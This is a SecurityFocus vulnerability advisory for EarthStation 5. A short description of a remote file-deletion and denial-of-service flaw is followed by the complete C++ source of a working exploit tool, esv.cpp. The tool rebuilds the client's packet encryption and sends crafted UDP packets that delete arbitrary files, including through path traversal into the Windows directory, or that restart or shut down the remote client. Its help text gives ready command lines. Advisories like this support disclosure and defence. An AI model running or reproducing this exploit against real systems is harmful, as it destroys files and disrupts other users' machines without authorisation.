source: http://www.securityfocus.com/bid/8753/info

It has been reported that EarthStation 5 is prone to a file deletion vulnerability that may allow a remote attacker to delete arbitrary files on a vulnerable system. The problem is reported to exist in the "Search Service" packet handler employed by the software. An attacker may exploit this issue by sending packet 0Ch and sub-function 07h to a client running the vulnerable version of the software.

Successful exploitation of this issue may allow an attacker to delete files in the shared folder or sensitive files on the system in the context of the user running the vulnerable software. This issue could lead to a denial of service condition causing the system to crash or hang.

It has also been reported that the software is prone to other denial of service and buffer overflow vulnerabilities, however any details have not been specified.

EarthStation 5 build 1266 and 2180 have been reported to be vulnerable to this issue, however other versions may be affected as well.

********** BEGIN esv.cpp **********
/*
 * esv - "ExploitStation V" or "EarthStation Vulnerabilities"
 * (C)2003 random nut (randnut@yahoo.com)
 * All rights reserved.
 *
 * This code is released to the public because the people behind ES5
 * would claim I lie. Thus, I have no choice but to let everyone
 * download and run this application to prove that I'm right. Only try
 * this on computers you're allowed to delete files on, and don't try
 * this at home kids.
 */

#include <WinSock2.h>
#include <windows.h>
#include <stdio.h>
#include <string.h>

typedef unsigned char   uint8;
typedef unsigned short  uint16;
typedef unsigned long   uint32;
typedef signed char             int8;
typedef short                   int16;
typedef long                    int32;

uint32 __GetChecksum(const char* buf, int buflen = 0,
                                         int uplim = 0x7FFFFFFF, int 
lowlim = 0)
{
        if (buflen == 0)
                buflen = (int)strlen(buf);

        int chksum = 0;
        for (int i = 0; i < buflen; i++, buf++)
                chksum ^= *buf << (8*(i&3));

        return (uint32)(lowlim + (chksum % (uplim - lowlim + 1)));
}

uint32 GetChecksum(const char* lpszString)
{
        return __GetChecksum(lpszString) ^ 0x7FFFFFFF;
}

void InitPacket(uint32* pkt, int size, uint32 packet)
{
        memset(pkt, 0, size);

        pkt[0x0000/4] = size;
        pkt[0x0004/4] = 2180;
        pkt[0x0008/4] = packet;
        pkt[0x0058/4] = 0x3EFA;
}

void InitPacket0C(uint32* pkt, uint32 sub_func,
                                  const char* lpszString = "", uint32 
CheckSum = 0)
{
        InitPacket(pkt, 0x288, 0x0C);
        pkt[0x007C/4] = sub_func;
        pkt[0x0080/4] = CheckSum;
        strncpy((char*)&pkt[0x0088/4], lpszString, 0x200-1);
}

// IMPORTANT:
//      If ArraySize isn't a multiple of sizeof(uint32) then the last
//      bytes starting from pArray[ArraySize] will be overwritten.
static void EsvInitEncryptArray(char* pArray, int size, uint32 k)
{
        uint32 d = 0x78B7;
        uint32* pBuf = (uint32*)pArray;
        const uint32 c = 0x6AC690C5;
        const uint32 cl = c & 0xFFFF;
        const uint32 ch = c >> 0x10;

        for (int i = 0; i < size; i += 4, pBuf++)
        {
                const uint32 old_d = d;
                d = d * c + k;
                k = (((old_d >> 0x10) * ch) + (((old_d >> 0x10) * cl) >> 
0x10))
                        + (((old_d & 0xFFFF) * ch) >> 0x10);
                if (((old_d & 0xFFFF) * cl) >= (uint32)(-(int32)k))
                        k++;
                *pBuf = d;
        }
}

static void EncryptBuffer(char* pBuf, int size, const char* pArray,
                                                  int ArraySize)
{
        uint8* pWorkBuf = (uint8*)pBuf;

        for (int i = 0; i < size; i++, pWorkBuf++)
                *pWorkBuf ^= (uint8)(pArray[i % ArraySize] ^ i);
}

static void EsvEncrypt(void* pBuf, int size)
{
        const ArraySize = 0x2F;
        char Array[(ArraySize + sizeof(uint32) - 1) & 
~(sizeof(uint32)-1)];

        EsvInitEncryptArray(Array, ArraySize, size);
        EncryptBuffer((char*)pBuf, size, Array, ArraySize);
}

int SendPacket(uint32* pkt, uint32 IpAddr, uint16 IpPort,
                           int MaxSendTries)
{
        uint32 dwSize = pkt[0x0000/4];
        EsvEncrypt(pkt, dwSize);

        SOCKET s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (s == INVALID_SOCKET)
        {
                printf("socket() failed\n");
                return 0;
        }

        for (int i = 0; i < MaxSendTries; i++)
        {
                sockaddr_in sa;
                memset(&sa, 0, sizeof(sa));
                sa.sin_family = AF_INET;
                sa.sin_port = htons(IpPort);
                sa.sin_addr.s_addr = htonl(IpAddr);

                int size = sendto(s, (char*)pkt, dwSize, 0,
                                                (sockaddr*)&sa, 
sizeof(sa));
                if (size == SOCKET_ERROR || size != dwSize)
                {
                        printf("sendto() failed\n");
                        return 0;
                }
        }

        return 1;
}

void help()
{
        printf(
"/R <retries>            - Max UDP sendto() retries\n"
"/r                      - Restart remote computer's ES5.exe\n"
"/e                      - Tell remote computer's ES5.exe it's expired\n"
"/d <filename>           - Delete file <filename>\n"
"/s <shared dir>         - Remote computer's shared dir"
                                                        "(case 
sensitive.)\n"
"                          Use quotes if path contains spaces.\n"
"/i <IP>                 - Remote computer's IP\n"
"/p <PORT>               - Remote computer's \"Search Service\" port\n"
"\n"
"The examples below assume remote ES5.exe is using IP=127.0.0.1"
                " and port=1234\n"
"\n"
"Example 1:\n"
"    esv /r /i 127.0.0.1 /p 1234\n"
"This will restart remote computer's ES5.exe.\n"
"\n"
"Example 2:\n"
"    esv /e /i 127.0.0.1 /p 1234\n"
"This will force remote computer's ES5.exe to stop functioning, "
                                "and let the\n"
"user know about it.\n"
"\n"
"Example 3:\n"
"    esv /d ..\\..\\..\\WINDOWS\\NOTEPAD.EXE /s "
      "\"C:\\Program Files\\EarthStation5\\New Media Files\""
      " /i 127.0.0.1 /p 1234\n"
"This will delete the file \"\\WINDOWS\\NOTEPAD.EXE\". This will "
                        "not work\n"
"under Win98 (and probably Win95/WinME) but does work under "
                        "WinXP (and\n"
"probably WinNT, Win2000, Win2003)\n"
"\n"
"Example 4:\n"
"    esv /d readme.txt /s \"C:\\Program Files\\EarthStation5\\"
                   "New Media Files\" /i 127.0.0.1 /p 1234\n"
"This will delete the file \"readme.txt\" in the folder\n"
"\"C:\\Program Files\\EarthStation5\\New Media Files\".\n"
"and works with all Windows versions\n"
"\n"
"IMPORTANT:\n"
"The shared folder is case sensitive, and you must use the exact "
                        "same path\n"
"as ES5.exe does. If path = \"C:\\Program Files\\ES5\\Files\", "
                        "then make sure\n"
"that ES5.exe doesn't use the shorter path \"C:\\Progra~1\\ES5"
                "\\Files\"\n"
"or has uppercased all letters. You can find out the exact path in\n"
"ES5.exe's settings. Copy and paste that string.\n"
);
        exit(1);
}

char* NewDirString(const char* s)
{
        char* szNew = (char*)malloc(strlen(s) + 1 + 1);
        if (szNew == NULL)
                return szNew;

        strcpy(szNew, s);
        strcat(szNew, "\\");
        return szNew;
}

int main(int argc, char** argv)
{
        int MaxSendTries = 50;          // Should be more than enough...
        uint32 IpAddr = 0;                      // Remote comp's IP
        uint16 IpPort = 0;                      // Remote comp's Search 
Service port
        int RestartOption = 0;          // /r option
        int ExitOption = 0;                     // /e option
        int DeleteOption = 0;           // /d option
        const char* lpszSharedDir = NULL;
        const char* lpszFilename = NULL;
        uint32 pkt0C[0x0288/4];

        for (int i = 1; i < argc; i++)
        {
                char* s = argv[i];
                if (*s != '/' && *s != '-')
                        help();
                s++;
                if (!strcmp(s, "r"))
                {
                        RestartOption = 1;
                }
                else if (!strcmp(s, "e"))
                {
                        ExitOption = 1;
                }
                else if (!strcmp(s, "d"))
                {
                        DeleteOption = 1;
                        if (++i >= argc)
                                help();
                        lpszFilename = argv[i];
                }
                else if (!strcmp(s, "s"))
                {
                        if (++i >= argc)
                                help();
                        lpszSharedDir = NewDirString(argv[i]);
                        if (lpszSharedDir == NULL)
                        {
                                printf("Out of memory\n");
                                return 1;
                        }
                }
                else if (!strcmp(s, "i"))
                {
                        if (++i >= argc)
                                help();
                        IpAddr = inet_addr(argv[i]);
                        if (IpAddr == INADDR_NONE)
                                help();
                        IpAddr = ntohl(IpAddr);
                }
                else if (!strcmp(s, "p"))
                {
                        if (++i >= argc)
                                help();
                        uint32 p = strtoul(argv[i], NULL, 0);
                        if (p == 0 || p > 0xFFFF)
                                help();
                        IpPort = (uint16)p;
                }
                else if (!strcmp(s, "R"))
                {
                        if (++i >= argc)
                                help();
                        MaxSendTries = strtoul(argv[i], NULL, 0);
                }
                else
                {
                        help();
                }
        }

        if (IpAddr == 0 || IpPort == 0)
                help();

        WSAData wsa;
        int ret;
        if ((ret = WSAStartup(MAKEWORD(2,2), &wsa)) != 0)
        {
                printf("Could not initialize WinSock. Error %08X\n", ret);
                return 1;
        }
        if (wsa.wVersion != 0x0202)
        {
                printf("Couldn't init WinSock 2.2\n");
                return 1;
        }

        int did_something = 0;
        if (DeleteOption)
        {
                if (lpszFilename == NULL || lpszSharedDir == NULL)
                        help();

                printf("Sending command to delete file \"%s\" in folder "
                                "\"%s\"...", lpszFilename, lpszSharedDir);
                InitPacket0C(pkt0C, 0x07, lpszFilename,
                                        GetChecksum(lpszSharedDir));
                if (!SendPacket(pkt0C, IpAddr, IpPort, MaxSendTries))
                        return 1;
                printf("Done!\n");
                did_something = 1;
        }

        if (RestartOption)
        {
                InitPacket0C(pkt0C, 0x2F);
                printf("Sending command to restart remote ES5.exe...");
                if (!SendPacket(pkt0C, IpAddr, IpPort, MaxSendTries))
                        return 1;
                printf("Done!\n");
                did_something = 1;
        }

        if (ExitOption)
        {
                InitPacket0C(pkt0C, 0x09);
                printf("Sending command to close remote ES5.exe...");
                if (!SendPacket(pkt0C, IpAddr, IpPort, MaxSendTries))
                        return 1;
                printf("Done!\n");
                did_something = 1;
        }

        if (!did_something)
                help();
}
********** END esv.cpp **********


